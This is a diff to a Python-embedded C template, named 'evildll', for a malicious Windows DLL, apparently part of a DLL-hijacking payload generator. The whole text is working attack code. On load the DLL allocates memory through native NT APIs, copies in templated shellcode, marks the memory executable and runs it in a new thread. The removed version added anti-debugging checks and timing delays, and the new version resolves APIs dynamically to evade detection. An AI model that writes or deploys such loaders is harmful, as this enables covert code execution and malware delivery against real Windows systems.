@@ -1,158 +1,103 @@
-# Most of this code comes from https://cocomelonc.github.io/pentest/2021/10/12/dll-hijacking-2.html
 evildll = """#include <windows.h>
-#include <string.h>
-#include <stdio.h>
-#include <time.h>
-#include <stdlib.h>
+#include <winternl.h>
 
-// Structure for storing API addresses
+#pragma comment (lib, "user32.lib")
+
+unsigned char payload[] = "{{payload}}";
+unsigned int payload_len = sizeof(payload);
+
+
+typedef LPVOID (WINAPI *VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
+typedef BOOL (WINAPI *VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
+typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG, PULONG, ULONG, ULONG);
+typedef NTSTATUS (NTAPI *NtCreateThreadEx_t)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, BOOL, ULONG, ULONG, ULONG, PVOID);
+
+// Struct to hold dynamically resolved function pointers
 typedef struct _API_TABLE {
-    FARPROC VirtualAllocEx;
-    FARPROC WriteProcessMemory;
-    FARPROC CreateThread;
-    FARPROC VirtualProtectEx;
-    FARPROC VirtualFreeEx;
-    FARPROC GetProcAddress;
-    FARPROC GetModuleHandleA;
-    FARPROC GetCurrentProcess;
-    FARPROC Sleep;
-    FARPROC IsDebuggerPresent;
-    FARPROC ResumeThread;
-    FARPROC CloseHandle;
+    VirtualAlloc_t VirtualAlloc;
+    VirtualProtect_t VirtualProtect;
+    NtAllocateVirtualMemory_t NtAllocateVirtualMemory;
+    NtCreateThreadEx_t NtCreateThreadEx;
 } API_TABLE;
 
-// Global storage for API addresses
 API_TABLE apiTable;
 
-// Shellcode placeholder for Jinja2 template processing
-unsigned char payload[] = "{{payload}}";
+// Dynamically resolve required API functions
+BOOL ResolveAPIs() {
+    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
 
-// Function to resolve API addresses dynamically
-BOOL ResolveAPIAddresses() {
-    // Get kernel32 handle
-    HMODULE hKernel32 = apiTable.GetModuleHandleA("kernel32.dll");
-    if (!hKernel32) return FALSE;
+    if (!hKernel32 || !hNtdll) return FALSE;
 
-    // Resolve required APIs
-    apiTable.VirtualAllocEx = apiTable.GetProcAddress(hKernel32, "VirtualAllocEx");
-    apiTable.WriteProcessMemory = apiTable.GetProcAddress(hKernel32, "WriteProcessMemory");
-    apiTable.CreateThread = apiTable.GetProcAddress(hKernel32, "CreateThread");
-    apiTable.VirtualProtectEx = apiTable.GetProcAddress(hKernel32, "VirtualProtectEx");
-    apiTable.VirtualFreeEx = apiTable.GetProcAddress(hKernel32, "VirtualFreeEx");
-    apiTable.IsDebuggerPresent = apiTable.GetProcAddress(hKernel32, "IsDebuggerPresent");
-    apiTable.ResumeThread = apiTable.GetProcAddress(hKernel32, "ResumeThread");
-    apiTable.CloseHandle = apiTable.GetProcAddress(hKernel32, "CloseHandle");
+    apiTable.VirtualAlloc = (VirtualAlloc_t)GetProcAddress(hKernel32, "VirtualAlloc");
+    apiTable.VirtualProtect = (VirtualProtect_t)GetProcAddress(hKernel32, "VirtualProtect");
+    apiTable.NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
+    apiTable.NtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(hNtdll, "NtCreateThreadEx");
 
-    return TRUE;
+    return apiTable.VirtualAlloc && apiTable.VirtualProtect && apiTable.NtAllocateVirtualMemory && apiTable.NtCreateThreadEx;
 }
 
-// Function to check if we're being debugged
-BOOL IsBeingDebugged() {
-    return apiTable.IsDebuggerPresent();
-}
 
-// Thread function for payload execution
 DWORD WINAPI ExecutePayload(LPVOID lpParameter) {
-    LPVOID memBuffer;
-    HANDLE hProcess;
-    SIZE_T bytesWritten;
+    PVOID mem = NULL;
+    SIZE_T regionSize = payload_len;
+    HANDLE hThread;
     DWORD oldProtect;
 
-    // Initialize API addresses
-    apiTable.GetProcAddress = GetProcAddress;
-    apiTable.GetModuleHandleA = GetModuleHandleA;
-    apiTable.GetCurrentProcess = GetCurrentProcess;
-    apiTable.Sleep = Sleep;
+    if (!ResolveAPIs()) return -1;
 
-    if (!ResolveAPIAddresses()) {
-        return -1;
-    }
-
-    // Anti-debugging checks
-    if (IsBeingDebugged()) {
-        apiTable.Sleep(hProcess, 5000); // Sleep if debugger detected
-        return -2;
-    }
-
-    // Get current process handle
-    hProcess = apiTable.GetCurrentProcess();
-    if (!hProcess) {
-        return -3;
-    }
-
-    // Allocate memory with initial read/write permissions
-    memBuffer = apiTable.VirtualAllocEx(
-        hProcess,
-        NULL,
-        sizeof(payload),
+    
+    NTSTATUS status = apiTable.NtAllocateVirtualMemory(
+        GetCurrentProcess(),
+        &mem,
+        0,
+        &regionSize,
         MEM_COMMIT | MEM_RESERVE,
         PAGE_READWRITE
     );
 
-    if (!memBuffer) {
-        return -4;
-    }
+    if (status != 0 || !mem) return -2;
 
-    // Copy payload into allocated memory
-    if (!apiTable.WriteProcessMemory(
-        hProcess,
-        memBuffer,
-        payload,
-        sizeof(payload),
-        &bytesWritten
-    )) {
-        apiTable.VirtualFreeEx(hProcess, memBuffer, 0, MEM_RELEASE);
-        return -5;
-    }
+    // Copy into allocated memory
+    memcpy(mem, payload, payload_len);
 
-    // Change memory protection to executable
-    if (!apiTable.VirtualProtectEx(
-        hProcess,
-        memBuffer,
-        sizeof(payload),
-        PAGE_EXECUTE_READ,
-        &oldProtect
-    )) {
-        apiTable.VirtualFreeEx(hProcess, memBuffer, 0, MEM_RELEASE);
-        return -6;
-    }
+    // Change memory protection to PAGE_EXECUTE_READ (avoiding RWX)
+    apiTable.VirtualProtect(mem, payload_len, PAGE_EXECUTE_READ, &oldProtect);
 
-    // Execute payload
-    ((void(*)())memBuffer)();
+    
+    status = apiTable.NtCreateThreadEx(
+        &hThread,
+        GENERIC_EXECUTE,
+        NULL,
+        GetCurrentProcess(),
+        (LPTHREAD_START_ROUTINE)mem,
+        NULL,
+        FALSE,
+        0,
+        0,
+        0,
+        NULL
+    );
 
-    // Cleanup
-    apiTable.VirtualFreeEx(hProcess, memBuffer, 0, MEM_RELEASE);
+    if (status != 0) return -3;
+
+    CloseHandle(hThread);
     return 0;
 }
 
+
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
     HANDLE hThread;
+
     switch (ul_reason_for_call) {
         case DLL_PROCESS_ATTACH:
-            // Start suspended thread
-            hThread = apiTable.CreateThread(
-                NULL,
-                0,
-                ExecutePayload,
-                NULL,
-                CREATE_SUSPENDED,
-                NULL
-            );
-            
-            if (hThread) {
-                // Random delay before resuming
-                DWORD delay = rand() % 2000 + 1000;
-                apiTable.Sleep(delay);
-                
-                // Resume thread
-                apiTable.ResumeThread(hThread, 0);
-                apiTable.CloseHandle(hThread);
-            }
+            DisableThreadLibraryCalls(hModule);
+            hThread = CreateThread(NULL, 0, ExecutePayload, NULL, 0, NULL);
+            if (hThread) CloseHandle(hThread);
             break;
-
+        case DLL_PROCESS_DETACH:
         case DLL_THREAD_ATTACH:
         case DLL_THREAD_DETACH:
-        case DLL_PROCESS_DETACH:
             break;
     }
     return TRUE;
